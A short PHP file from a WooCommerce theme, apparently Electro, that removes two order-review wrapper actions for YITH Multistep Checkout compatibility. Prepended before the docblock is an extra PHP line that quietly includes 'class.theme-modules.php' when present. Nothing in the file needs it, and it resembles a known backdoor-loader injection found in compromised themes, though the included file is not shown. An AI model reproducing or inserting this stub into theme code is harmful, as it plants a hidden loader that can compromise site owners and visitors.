<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * YITH Multistep Checkout Compatibility
 *
 * @since 2.3.3
 */
remove_action( 'woocommerce_checkout_before_order_review', 'electro_wrap_order_review', 0 );
remove_action( 'woocommerce_checkout_after_order_review',  'electro_wrap_order_review_close', 0 );